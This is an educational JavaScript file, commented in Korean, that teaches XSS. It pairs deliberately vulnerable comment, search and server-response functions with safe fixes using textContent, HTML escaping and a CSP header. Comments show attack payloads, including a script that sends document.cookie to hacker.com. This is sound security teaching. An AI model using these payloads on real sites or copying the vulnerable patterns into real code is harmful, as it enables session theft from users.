// 교육용 코드 - 보안 취약점을 이해하기 위한 예제입니다
// 절대 프로덕션(실제 서비스)에서 사용하지 마세요!

// ============================================================
// XSS (Cross-Site Scripting, 크로스 사이트 스크립팅)
// 비유: 교실 게시판에 "이 QR코드 찍어봐!" 붙여놓고,
//       찍으면 개인정보가 빠져나가는 것
// ============================================================


// ============================================================
// 취약한 코드 (위험!)
// 사용자 입력을 HTML에 직접 삽입해서 스크립트 실행 가능
// ============================================================

// --- 예제 1: 댓글 표시 ---

// 취약한 댓글 표시 함수
// [주의] 실제 코드에서는 절대 이 방식을 사용하지 마세요!
function unsafeDisplayComment(comment) {
  // 사용자가 입력한 댓글을 DOM에 HTML로 직접 삽입!
  // HTML 태그가 그대로 실행됨
  const commentBox = document.getElementById('comments');

  // 위험: insertAdjacentHTML에 사용자 입력을 직접 넣으면
  // <script> 태그나 이벤트 핸들러가 실행될 수 있음!
  commentBox.insertAdjacentHTML('beforeend',
    '<div class="comment">' + comment + '</div>'
  );
}

// --- 공격 시나리오 ---
// 정상 사용자: comment = "좋은 글이네요!"
//   -> 화면에 "좋은 글이네요!" 표시 (OK)
//
// 공격자: comment = '<img src=x onerror="alert(document.cookie)">'
//   -> 이미지 로드 실패 -> onerror 실행 -> 쿠키(로그인 정보) 탈취!
//
// 더 위험한 공격:
// comment = '<script>fetch("https://hacker.com/steal?data="+document.cookie)</script>'
//   -> 글을 읽은 모든 사람의 로그인 정보가 해커 서버로 전송!


// --- 예제 2: 검색 결과 표시 ---

// 취약한 검색 결과 표시
// [주의] 사용자 입력을 DOM에 HTML로 직접 넣는 위험한 패턴!
function unsafeSearchResult(searchTerm) {
  const resultDiv = document.getElementById('result');
  // 검색어를 HTML 문자열에 직접 포함시켜 DOM에 삽입
  resultDiv.insertAdjacentHTML('beforeend',
    '<p>"' + searchTerm + '"에 대한 검색 결과입니다</p>'
  );
}

// --- 공격 시나리오 ---
// URL: /search?q=<script>alert('해킹!')</script>
// 검색어가 페이지에 그대로 들어가서 스크립트가 실행됨!
// 이 URL을 다른 사람에게 보내면, 클릭한 사람이 피해를 입음


// --- 예제 3: 서버 사이드 XSS ---

// 취약한 서버 응답 (Node.js/Express)
// [주의] 사용자 입력을 HTML 응답에 직접 포함하면 위험!
function unsafeServerResponse(req, res) {
  const username = req.query.name;
  // 사용자 입력을 HTML 템플릿에 직접 삽입
  const html = '<html><body>'
    + '<h1>안녕하세요, ' + username + '님!</h1>'
    + '</body></html>';
  res.send(html);
}

// --- 공격 시나리오 ---
// URL: /hello?name=<script>document.location='https://hacker.com/steal'</script>
// 서버가 HTML을 만들 때 스크립트가 포함됨
// 브라우저가 이 HTML을 받으면 스크립트 실행!


// ============================================================
// 안전한 코드 (수정됨)
// 사용자 입력을 안전하게 처리해서 스크립트 실행 방지
// ============================================================

// --- 방법 1: textContent 사용 (가장 간단) ---

// 안전한 댓글 표시 함수
function safeDisplayComment(comment) {
  const commentBox = document.getElementById('comments');
  // 새 div 요소를 만들고 textContent로 텍스트만 삽입
  // HTML 태그가 실행되지 않고 그냥 글자로 표시됨
  const div = document.createElement('div');
  div.className = 'comment';
  div.textContent = comment;  // textContent = 안전!
  commentBox.appendChild(div);
}

// 이제 공격자가 '<script>alert("해킹!")</script>'을 입력해도
// 화면에 '<script>alert("해킹!")</script>' 텍스트가 보일 뿐
// 스크립트가 실행되지 않음!


// --- 방법 2: HTML 이스케이프 함수 ---

// HTML 특수문자를 안전한 문자로 변환하는 함수
function escapeHtml(text) {
  const map = {
    '&': '&amp;',    // & -> &amp;
    '<': '&lt;',     // < -> &lt;
    '>': '&gt;',     // > -> &gt;
    '"': '&quot;',   // " -> &quot;
    "'": '&#039;'    // ' -> &#039;
  };
  return text.replace(/[&<>"']/g, (char) => map[char]);
}

// 안전한 검색 결과 표시
function safeSearchResult(searchTerm) {
  const resultDiv = document.getElementById('result');
  // 검색어의 HTML 특수문자를 이스케이프
  const safeSearchTerm = escapeHtml(searchTerm);
  const p = document.createElement('p');
  p.textContent = '"' + searchTerm + '"에 대한 검색 결과입니다';
  resultDiv.appendChild(p);
}

// 이제 '<script>alert("해킹!")</script>'을 입력하면
// 화면에 텍스트로 보이고, 실행되지 않음!


// --- 방법 3: 서버 사이드 보호 ---

// 안전한 서버 응답 (Node.js/Express)
function safeServerResponse(req, res) {
  const username = req.query.name;

  // 1. 입력 검증: 허용된 문자만
  if (!username || !/^[a-zA-Z0-9가-힣\s]{1,50}$/.test(username)) {
    return res.status(400).send('올바른 이름을 입력해주세요');
  }

  // 2. HTML 이스케이프 적용
  const safeName = escapeHtml(username);

  // 3. Content-Security-Policy 헤더 설정
  //    인라인 스크립트 실행을 브라우저가 차단
  res.setHeader('Content-Security-Policy', "script-src 'self'");

  const html = '<html><body>'
    + '<h1>안녕하세요, ' + safeName + '님!</h1>'
    + '</body></html>';
  res.send(html);
}


// ============================================================
// 핵심 정리
// ============================================================
//
// 위험한 패턴 (절대 하지 말 것):
//   DOM에 사용자 입력을 HTML로 직접 삽입하는 모든 방법
//   서버에서 사용자 입력을 HTML 응답에 직접 포함
//
// 안전한 패턴 (항상 이렇게):
//   element.textContent = userInput     (클라이언트)
//   escapeHtml(userInput)               (HTML에 넣어야 할 때)
//   Content-Security-Policy 헤더 설정   (서버)
//
// 3가지 방어 원칙:
//   1. 출력 시 이스케이프 (< -> &lt; 등)
//   2. DOM 조작 시 textContent 사용
//   3. CSP(Content-Security-Policy) 헤더로 스크립트 실행 제한
//
// 기억하세요:
//   "사용자 입력을 절대 HTML로 직접 출력하지 마세요!"
